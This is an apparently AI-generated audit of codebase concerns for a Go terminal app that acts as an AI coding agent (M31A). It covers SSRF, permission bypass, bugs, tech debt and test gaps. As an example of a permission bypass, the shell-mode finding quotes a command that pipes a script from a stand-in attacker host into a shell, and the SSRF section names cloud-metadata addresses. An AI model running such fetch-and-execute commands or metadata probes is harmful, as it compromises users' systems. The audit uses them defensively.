# Codebase Concerns

**Analysis Date:** 2026-06-02

## Status Note

A previous cross-phase audit (`.planning/audit_phase_0_5.md`, 2026-05-28) flagged 7
issues (1 CRITICAL, 2 HIGH, 4 MEDIUM). Of those:
- **CRITICAL** ("binary does not launch TUI") — **fixed** in `cmd/m31a/main.go`
  which now wires the full app, registry, and Bubble Tea loop.
- **HIGH** ("permission listener goroutine mutates AppState") — **fixed** in
  `internal/tui/app.go:423-428` via `permissionListenerCmd` that returns a
  `tea.Cmd` instead of calling `Update()` from a goroutine.
- **HIGH** ("SetWidth error not checked") — **fixed** in
  `internal/tui/repl.go:262-265` (error from `msgRenderer.SetWidth` is now
  captured into `m.lastStatus`).
- **MEDIUM** ("Grep/Glob missing DurationMs") — **fixed** in
  `internal/tools/grep.go:102` and `internal/tools/glob.go:107`.
- **MEDIUM** ("fmt.Printf for keychain errors") — **fixed** in
  `internal/config/loader.go:517,530` which now use `slog.Warn`.

The findings below are **new or unaddressed** issues discovered during this
2026-06-02 sweep.

## Security Considerations

### WebFetch tool has no SSRF protection

**Area:** `internal/tools/webfetch.go`

- **Risk:** The `WebFetch` tool accepts any `http`/`https` URL with no allow-list
  or IP-range check. A user (or LLM tool-call) can hit `http://localhost:8080`,
  `http://127.0.0.1`, `http://169.254.169.254` (cloud metadata), or any RFC1918
  private range. The tool description and current TUI exposes it to the LLM.
- **Files:** `internal/tools/webfetch.go:55-90`
- **Current mitigation:** None beyond the 5-redirect cap and 5MB body cap.
- **Recommendations:** Resolve the URL's host and reject loopback, link-local
  (`169.254/16`, `fe80::/10`), and RFC1918 ranges by default. Add a
  `--allow-private-ips` config flag for power users. The Phase-1 audit
  incorrectly marked "no WebFetch in V1" — the tool was added in Phase 3-4
  but never received the SSRF protection that the ROADMAP originally specified
  for V1.1.

### Shell mode (`!command`) bypasses all risk-based permissions

**Area:** `internal/tools/dispatcher.go:110-119` and `internal/tui/repl.go:1025-1031`

- **Risk:** When the user enters `!command` in the REPL, the dispatcher's
  `interactive=false` branch (lines 110-119) silently approves the tool
  **regardless of risk level**. Only `deny` rules are honored; `ask` rules
  and the risk-level default (modal for `RiskDangerous`/`RiskDestructive`) are
  skipped. A user can type `!sudo rm -rf /tmp/foo` or `!curl evil.com|sh`
  and it executes without any prompt.
- **Files:** `internal/tools/dispatcher.go:108-125`, `internal/tui/repl.go:1025-1031`
- **Current mitigation:** In-line comment claims "PermissionRule deny rules
  still apply" — this is true but `ask` rules and risk-level gating do not.
- **Recommendations:** Either (a) require an explicit `shell_allow_risky = true`
  in `~/.m31a/config.toml` to enable this behavior, or (b) re-introduce the
  risk-level check after the `interactive=false` branch so destructive commands
  still surface the modal. The current behavior contradicts the documented
  safety story in `docs/ARCHITECTURE.md` and the RiskLevel enum.

### Env var name mismatch between `--help` and runtime loader

**Area:** `cmd/m31a/main.go:49-50` vs `internal/config/loader.go:510,524`

- **Risk:** The `--help` output tells users to set `OPENROUTER_API_KEY` and
  `ZEN_API_KEY`, but `config.Load` reads `M31A_OPENROUTER_API_KEY` and
  `M31A_ZEN_API_KEY`. Users following `--help` instructions will silently
  have no API key resolved and be routed into the "No API key configured"
  REPL. The env var resolution was changed during Phase 11 (per
  `STATE.md` — "11-02: Multi-Layer Configuration") but `main.go` was not
  updated to match.
- **Files:** `cmd/m31a/main.go:49-50`
- **Current mitigation:** None.
- **Recommendations:** Either revert loader to also accept the unprefixed
  names, or update the `--help` output and any README/install docs to use
  the `M31A_*` prefix. Decide once and document it in `docs/TYPES.md`
  (which still lists the unprefixed names as canonical).

### Hardcoded `HOME` lookup in ship phase

**Area:** `internal/workflow/ship.go:80-82`

- **Risk:** Ship phase uses `os.Getenv("HOME")` then `os.Getenv("USERPROFILE")`
  to locate the ledger path, while every other place in the codebase
  (`internal/log/log.go:15`, `cmd/m31a/main.go:81`, `internal/tui/commands.go:1134,1229`)
  uses `os.UserHomeDir()`. On chroots, containers, or Windows shells with
  unusual env, this can return an empty string and silently skip ledger
  append (the code only logs a warn). The "chore: ship" commit will still
  be made.
- **Files:** `internal/workflow/ship.go:79-89`
- **Current mitigation:** Code checks for empty string and skips append.
- **Recommendations:** Replace with `os.UserHomeDir()` for consistency and
  add a hard error if it fails — the user should know ledger updates are
  being skipped.

### `dispatcher.go` panic on duplicate tool registration

**Area:** `internal/tools/dispatcher.go:66`

- **Risk:** `Register()` calls `panic` if a tool is registered twice. This
  is a fast-fail in `main` (fine) but `Register` is exported and could be
  called by plugins or future code paths. Same anti-pattern in
  `internal/provider/registry.go:24` (panics on empty provider name).
- **Files:** `internal/tools/dispatcher.go:60-68`, `internal/provider/registry.go:21-28`
- **Current mitigation:** None — by design.
- **Recommendations:** Return an `error` from `Register`; let `main.go`
  decide whether to panic.

## Known Bugs

### `workflowMsgDrainer` silently drops messages when channel is full

**Area:** `internal/tui/app.go:403-410`

- **Symptom:** The `channelEmitter.Emit()` writes to a buffered channel with
  `select { case ch <- msg: default: slog.Warn(...) }`. Under burst load
  (e.g. multi-task execute phase), phase events are lost and the TUI may
  show stale state.
- **Files:** `internal/tui/app.go:399-410`
- **Trigger:** Workflow engine emits faster than Bubble Tea drains the channel
  (default buffer is whatever `make(chan tea.Msg)` allocates — zero).
- **Workaround:** None.
- **Fix approach:** Use a larger buffered channel (`make(chan tea.Msg, 64)`)
  and/or block-with-timeout in `Emit`. Audit the channel constructor at
  `app.go` initialization.

### Plan screen `E` (Edit) is a no-op

**Area:** `internal/tui/plan.go:69-71`

- **Symptom:** Pressing `E` on the Plan screen silently does nothing.
  Acceptance criterion 9 says "user can Accept, Edit, or Retry".
- **Files:** `internal/tui/plan.go:69-71` (`// V1: placeholder for edit`)
- **Workaround:** Use `R` (Retry) which sends the user back to REPL; there
  is no way to actually edit a task description inline.
- **Fix approach:** Either implement the edit flow (open an inline textarea
  bound to `m.tasks[selected]`) or hide the `E` hint from the toolbar in
  `View()` at line 91.

### Ship screen `O` (Open in browser) is a no-op

**Area:** `internal/tui/ship.go:54-58`

- **Symptom:** Pressing `O` on the Ship screen does nothing. The hint is
  shown in the toolbar (`View()` at line 102).
- **Files:** `internal/tui/ship.go:54-58` (`// Open in browser (V1: placeholder)`)
- **Fix approach:** Detect a dev-server URL from session goal keywords
  (e.g. "vite", "next dev", "go run") and shell out to `xdg-open`/`open`/
  `start`, OR remove the `O` hint and the keybinding.

### `/config <key> <value>` is incomplete

**Area:** `internal/tui/commands.go:648-729`

- **Symptom:** Only 9 specific keys can be set via the `/config` slash
  command (theme, model.default, ui.compact_mode, ui.show_token_usage,
  provider.auto_fallback, ledger.enabled, permissions.mode,
  ui.show_cost_estimate, model.auto_arbitrage). All other valid config
  keys (provider.openrouter.api_key, provider.zen.api_key, model.*,
  ui.max_iterations, permissions.rules, features.*, ledger.max_entries)
  are not settable via `/config`.
- **Files:** `internal/tui/commands.go:658` (`// Setting a config value (V1: simple key=value via dot notation)`)
- **Workaround:** Use the Settings screen (`/settings`) or edit
  `~/.m31a/config.toml` directly.
- **Fix approach:** Either implement generic dotted-path setter using
  reflection, or make `/config` return the list of settable keys when
  called with a single argument (now it returns `Unknown config key`).

## Tech Debt

### Missing workflow slash commands required by acceptance criteria

**Area:** `internal/tui/commands.go:162-191` (`DefaultCommands`)

- **Issue:** `REQUIREMENTS.md` criterion 19 requires
  `/new`, `/plan`, `/execute`, `/verify`, `/ship`, `/workflow`, `/pause`,
  `/resume-task`. The actual implementation provides `/workflow <goal>`
  and `/phase <phase> <goal>`. There is no `/pause`, `/resume-task`,
  or per-phase shortcut (`/plan`, `/execute`, etc.). Criterion 22 also
  requires `/optimize` for the arbitrage feature — not registered.
- **Files:** `internal/tui/commands.go:162-191`
- **Impact:** The roadmap and requirements mark these as V1 acceptance
  criteria. The CHANGELOG claims v1.0.0 is shipped (2026-05-29), but
  these commands are absent.
- **Fix approach:** Add aliases in `DefaultCommands()` (e.g.
  `/plan → /phase plan`, `/execute → /phase execute`) and wire
  `app.go:1021-1071` interception to also match them. Register
  `/optimize` as a thin wrapper around the existing `pkg/arbitrage`
  recommend path already used in `repl.go:461`. Add `/pause` and
  `/resume-task` (or remove them from criteria).

### Zen client always advertises `Tools: true` regardless of model

**Area:** `internal/provider/zen/client.go:150-153`

- **Issue:** The Zen model catalog response (`/models` endpoint) doesn't
  include capability flags, so the client hardcodes
  `Capabilities: types.CapFlags{Tools: true, Reasoning: false}` for every
  model. This causes tool calls to be sent to models that may not support
  them, leading to provider-side 400 errors that surface to the user as
  `ErrContextExceeded` or generic `tool execution failed`.
- **Files:** `internal/provider/zen/client.go:131-156`
- **Impact:** Tool-use fails silently for unsupported models; user sees
  cryptic errors.
- **Fix approach:** Maintain a static map of known Zen model capabilities
  (similar to `reasoning.go`'s prefix map), fall back to `Tools: false`
  for unknown IDs, and emit a warning to the log on fallback.

### OpenRouter capability detection is string-sniff based

**Area:** `internal/provider/openrouter/client.go:158-167`

- **Issue:** `Tools: strings.Contains(m.Architecture.Tokenizer, "tools") || strings.Contains(m.Architecture.Modality, "tool")`
  and
  `Reasoning: strings.Contains(m.Description, "reasoning") || strings.Contains(m.ID, "r1")`
  are fragile heuristics. A description change from the provider breaks
  capability detection without any test catching it.
- **Files:** `internal/provider/openrouter/client.go:162-167`
- **Impact:** Tools or thinking may be silently disabled or enabled
  incorrectly.
- **Fix approach:** Add an explicit `supported_parameters` or
  `capabilities` field check, and fall back to a per-ID allow-list for
  known models (similar to `reasoning.go`).

### Sequential task execution limits V1 throughput

**Area:** `pkg/taskrunner/runner.go:59`

- **Issue:** The runner comment says "In V1, tasks within a group run
  sequentially" but the topological sort already groups independent
  tasks. This is by design for V1, but a user with a 20-task plan where
  10 are independent pays a 10x latency tax.
- **Files:** `pkg/taskrunner/runner.go:59` (comment), `:ExecuteGroup` (loop)
- **Impact:** Workflow takes 5-30 minutes longer than necessary on
  parallelizable plans.
- **Fix approach:** Document the limitation prominently in
  `docs/ARCHITECTURE.md` and `README.md`, or expose
  `M31A_PARALLEL_TASKS=2|3` env var to opt into bounded concurrency
  within a group (gated by Bubble Tea's single-threaded model, since
  tool dispatch is already async).

### `renderMessages()` rebuilds the full viewport on every stream chunk

**Area:** `internal/tui/repl.go` (search for `renderMessages`)

- **Issue:** The REPL calls `m.renderMessages()` from `handleStreamMsg`
  on every `StreamMsg`. Each call walks all messages and rebuilds a
  multi-kilobyte string. The 16ms frame budget (Phase 2 spec) can be
  exceeded on long conversations during high-rate token streams.
- **Files:** `internal/tui/repl.go:handleStreamMsg` and `renderMessages`
- **Impact:** UI jank during long responses; potential for missed
  `tea.Tick` intervals.
- **Fix approach:** Cache the rendered string and only re-render the
  trailing message (`m.messages[len(m.messages)-1]`). Add a benchmark
  in `internal/tui/repl_test.go` to catch regressions.

### Phase 11 Adaptations vs original docs diverge

**Area:** `docs/ARCHITECTURE.md`, `docs/INTERFACES.md`, `docs/TYPES.md`

- **Issue:** The interface and types docs were last updated in Phase 0/1
  and still describe the original Phase 0 design. New fields like
  `ModelInfo.Variant`, `RecentModelsData`, `SkipForLLM` on
  `types.Message`, `ParentID`/`ChildrenIDs` on `Session`, and
  `PermissionsAgentConfig` are not mirrored in `docs/INTERFACES.md`.
  The Phase 12 prompt-history-frecency code (`internal/tui/history.go`)
  and the `@filepath` regex in `repl.go:23` are undocumented.
- **Files:** `docs/INTERFACES.md`, `docs/TYPES.md`, `docs/ARCHITECTURE.md`
- **Impact:** Future LLM context for planning/execution will work from
  outdated interface definitions.
- **Fix approach:** Run `/gsd-docs-update` or have `/gsd-map-codebase`
  re-emit `INTEGRATIONS.md` and `STRUCTURE.md` after every phase to keep
  the docs in sync.

## Performance Bottlenecks

### Auto-arbitrage fires a full model fetch on every submit

**Area:** `internal/tui/repl.go:451-470`

- **Problem:** When `model.auto_arbitrage = true`, every user message
  triggers `p.FetchModels(fetchCtx)` (line 453) before sending. This
  is a network round-trip and JSON parse of the entire model catalog
  on every keystroke-and-submit, even though the result is already
  cached in `provider.ModelCache`.
- **Files:** `internal/tui/repl.go:451-470`
- **Cause:** Reaches past the cached models already loaded into
  `m.activeModel` and re-fetches from the network.
- **Improvement path:** Use the in-memory `p.(interface {
  CachedModels() []types.ModelInfo })` or expose a method on the
  registry. The cache has a 5-minute TTL, so this is essentially free
  data.

### Grep `rg` output is fully buffered before parsing

**Area:** `internal/tools/grep.go:127-174`

- **Problem:** `cmd.Output()` reads the entire ripgrep JSON output
  into memory before line-splitting and unmarshaling. On a large repo
  with many matches, this can allocate many MB and block the tool
  goroutine.
- **Files:** `internal/tools/grep.go:139-145`
- **Improvement path:** Use `cmd.StdoutPipe()` + a `bufio.Scanner` that
  emits a `StreamChunk` per line — same approach as the streaming
  provider.

## Fragile Areas

### Self-heal loop control flow is off-by-one risky

**Area:** `internal/workflow/execute.go:106-200`

- **Files:** `internal/workflow/execute.go:106-200`,
  `internal/workflow/verify.go:39-110`
- **Why fragile:** The loop is
  `for task.HealsAttempted <= m31types.MaxHealAttempts`
  with `MaxHealAttempts = 2` and `task.HealsAttempted++` inside on
  failure. This iterates 3 times on a persistent failure (heals 0, 1, 2)
  before returning `max heal attempts exceeded`. The comments in
  `types/constants.go:10` say "Maximum self-heal retries for a failed
  task" — ambiguous whether the count includes or excludes the initial
  attempt. Different code paths in `execute.go` and `verify.go` mutate
  `task.HealsAttempted` independently (verify mutates the slice
  element; execute mutates the local copy), so the two phases can
  disagree on attempt count if a task is verified across multiple
  phases.
- **Safe modification:** Define a single `attemptHeal(task *Task)` helper
  that returns `(shouldRetry bool, maxExceeded bool)`, and have both
  phases call it. Test with a 3-strike fixture.
- **Test coverage gaps:** No test verifies the `MaxHealAttempts = 2`
  boundary (3 attempts vs 2 retries).

### SSE parser buffer is 64KB

**Area:** `internal/provider/sse.go:17-18`

- **Files:** `internal/provider/sse.go:17-18`
- **Why fragile:** `scanner.Buffer(make([]byte, 0, 65536), 65536)` caps
  each line at 64KB. Some providers (especially with large
  `tool_calls.function.arguments` deltas) emit single lines larger than
  64KB. The scanner returns `bufio.ErrTooLong` and the entire stream
  fails.
- **Safe modification:** Raise to 1MB; verify with a fixture that emits
  a 200KB single-line event.
- **Test coverage:** No oversized-payload test exists.

### Channel emitter `default` drop in `app.go`

**Area:** `internal/tui/app.go:399-410` (already mentioned above)

- Re-listing as fragile: the `select { default: slog.Warn }` pattern
  means a phase event is lost without retry. A test that drives the
  workflow engine faster than the Bubble Tea update loop can reproduce.

### `cmd/test_zen/main.go` is a stray binary checked into source

**Area:** `cmd/test_zen/main.go`

- **Files:** `cmd/test_zen/main.go` (120 lines)
- **Why fragile:** Lives in `cmd/` and is a separate `main` package.
  `go build ./...` will compile it as `test_zen`, and the goreleaser
  config may attempt to package it. There is no test or doc explaining
  when to run it; it's a smoke test for the Zen client.
- **Recommendation:** Move to `cmd/test_zen/main_test.go` or to
  `internal/provider/zen/smoketest_test.go` behind a build tag, and
  add a comment explaining its purpose.

## Scaling Limits

### Model cache is per-client and unshared across providers

**Area:** `internal/provider/cache.go`, `internal/provider/openrouter/client.go:48-55`

- **Current capacity:** A few hundred models per provider (OpenRouter
  has ~300, Zen has ~30). No memory issues at this scale.
- **Limit:** The cache stores `*types.ModelInfo` pointers; if a future
  provider exposes 10k+ models, the in-memory map grows. No eviction
  policy beyond the 24h stale TTL.
- **Scaling path:** LRU eviction with max-size config; or move to a
  disk-backed bbolt.

### Session list scan walks filesystem

**Area:** `pkg/session/manager.go` (ListSessions, archive)

- **Current capacity:** A few hundred sessions per user is typical.
- **Limit:** `ListSessions` reads `session.json` from every directory
  under `~/.m31a/sessions/` on every call. With 1000 sessions this is
  1000 JSON parses on the main goroutine, called from the resume
  screen. UI will lag.
- **Scaling path:** Cache the sorted list in memory and invalidate
  on session create/delete/archive. Add an index file (`index.json`)
  that maps session ID → modified time, parse that first, then
  hydrate only visible sessions.

## Dependencies at Risk

### `github.com/pkoukk/tiktoken-go` for token estimation

**Area:** `internal/tokens/estimator.go:8`, `go.mod`

- **Risk:** `tiktoken-go` is a pure-Go port but is not officially
  maintained by OpenAI. Releases have stalled since 2024. If a new
  tokenizer (e.g. `o200k_base` for GPT-4o) ships, M31A will silently
  fall back to the rune-count heuristic.
- **Impact:** Token estimates become ±30% inaccurate for newer models.
- **Migration plan:** Add a fallback to `github.com/tiktoken-go-pro/tiktoken-go`
  or to the official OpenAI CGO library (would break `CGO_ENABLED=0`).

### `github.com/charmbracelet/*` rapid release cadence

**Area:** `go.mod` (charmbracelet/bubbletea, lipgloss, bubbles, glamour)

- **Risk:** Charm libraries release breaking changes regularly. The
  current `go.sum` pins to versions from late 2024 / early 2025; a
  `go get -u` may break the TUI.
- **Mitigation:** `go.mod` uses specific versions; no `latest` pseudo.

## Test Coverage Gaps

### No tests for `cmd/m31a/main.go`

- **What's not tested:** Config loading, provider registration,
  Bubble Tea startup, error paths on missing config / keychain.
- **Files:** `cmd/m31a/main.go:189` lines
- **Risk:** Refactor of `main.go` can silently break startup; CI
  won't catch it.
- **Priority:** High — main is the only entry point.

### No tests for `internal/log/log.go`

- **What's not tested:** Log rotation, file retention, M31A_LOG_FORMAT
  text vs JSON dispatch.
- **Files:** `internal/log/log.go` (log_test.go exists but covers
  trivial paths)
- **Risk:** Rotation bugs only surface after 24+ hours of uptime.
- **Priority:** Medium.

### No integration test for full workflow with mock LLM

- **What's not tested:** End-to-end Initialize → Discuss → Plan →
  Execute → Verify → Ship against a mocked provider. The
  `internal/workflow/integration_test.go` exists but its scope is
  unclear from grep.
- **Files:** `internal/workflow/integration_test.go`
- **Risk:** Phase transitions and the context-pruning contract can
  regress silently.
- **Priority:** High (acceptance criterion 8).

### Self-heal boundary cases

- **What's not tested:** `MaxHealAttempts = 2` boundary, the
  post-bisect heal path, and the "skipped on dependency failure"
  cascade in `taskrunner.Schedule`.
- **Files:** `pkg/taskrunner/runner.go`, `internal/workflow/verify.go`
- **Risk:** Bugs in retry counting (see "Self-heal loop off-by-one"
  above) can cause infinite loops or premature failure.
- **Priority:** High.

## Missing Critical Features

### `/optimize` for model arbitrage

- **Problem:** Acceptance criterion 22 requires `/optimize` to
  suggest cheaper model alternatives with savings percentage and an
  `O` key to accept all. Neither exists. The arbitrage logic is
  implemented in `pkg/arbitrage/arbitrage.go` and used only for
  silent auto-arbitrage in `repl.go:451-470`.
- **Blocks:** Cost-savings UX promised to users.
- **Fix approach:** Add `/optimize` slash command that calls
  `arbitrage.SuggestAll` and renders a table; add an `O` keybinding
  in Plan screen.

### `/pause` and `/resume-task` for workflow control

- **Problem:** Acceptance criterion 19 lists these but they don't
  exist. The Execute screen has a `P` keybinding mentioned in the
  original spec but `internal/tui/execute.go` only handles
  `up/down/s/S`.
- **Blocks:** User cannot pause a long-running execute phase.

### Test mode without API key

- **Problem:** There is no way to launch M31A without a key to
  explore the UI. The first-run "Skip" option (`firstrun.go:165-168`)
  lands in the REPL with "No API key configured" — but most commands
  still try to hit the network and fail with cryptic errors.
- **Blocks:** Onboarding demos, screenshots, CI smoke tests.
- **Fix approach:** Detect the no-key state in `app.go` and route
  `/commands` that don't need a model to a stub response.

## Anti-Patterns Observed

### `panic` used for control flow in `Register` paths

- **Where:** `internal/tools/dispatcher.go:66`,
  `internal/provider/registry.go:24`
- **Why wrong:** Panics in library code surface as 500-equivalent
  crashes in `main`. Returning an `error` is idiomatic and lets
  callers recover.
- **Do this instead:** Return `error` from `Register`; let `main`
  decide.

### V1 placeholders remain in shipped code

- **Where:** `internal/tui/plan.go:70`, `internal/tui/ship.go:57`,
  `internal/tui/commands.go:658`, `pkg/keychain/keychain.go:32`
- **Why wrong:** The CHANGELOG says v1.0.0 shipped 2026-05-29. The
  `// V1: placeholder` comments indicate incomplete work, not deferred
  work.
- **Do this instead:** Either complete the feature, remove the
  keybinding/hint, or move to a `v1.1` TODO with a tracked issue.

### `os.Getenv("HOME")` instead of `os.UserHomeDir()`

- **Where:** `internal/workflow/ship.go:80-82` (only occurrence in
  the codebase; every other file uses `os.UserHomeDir()`).
- **Why wrong:** Inconsistent; fails on systems with unusual env
  (snap, flatpak, chroots).
- **Do this instead:** `home, err := os.UserHomeDir()`.

### `fmt.Printf` in library code (already fixed in loader.go but still present elsewhere?)

- **Where to audit:** The previous audit flagged loader.go. Verify
  no other package uses `fmt.Print*` for diagnostic output.
  `internal/provider/openrouter/client.go:127-150` uses
  `log.Printf` (stdlib log, not slog) for model fetch errors —
  inconsistent with the rest of the codebase.
- **Do this instead:** Use `slog.Warn`/`slog.Error` via a
  package-level logger.

## Cross-Cutting Concerns

### `gofmt`/`goimports` not enforced in CI

- **Where:** `.github/workflows/ci.yml` only runs `golangci-lint`.
- **Risk:** Code style drift across contributors.
- **Fix:** Add a `gofmt -l .` step that fails on diff.

### No `-race` enforcement across packages

- **Where:** `.github/workflows/ci.yml` does run `go test -race`,
  but goroutines added during V1.0 phases (`shell mode`, streaming
  channel) were not covered by the race tests added in Phase 1.
- **Risk:** Data races in the streaming path surface only under
  load (e.g. mid-cancellation).
- **Fix:** Add `go test -race -count=1` to release tag pipeline.

### `panic` recovery in Bubble Tea `Update`

- **Where:** `internal/tui/app.go:445` (Update entry point).
- **Risk:** A panic in any screen's `Update` crashes the entire
  TUI. There is no `tea.Recover` middleware wrapping the program.
- **Fix:** Use `tea.NewProgram(app, tea.WithAltScreen())` with
  `tea.WithoutCatchPanics()` (default is to catch — verify intent).

---

*Concerns audit: 2026-06-02*
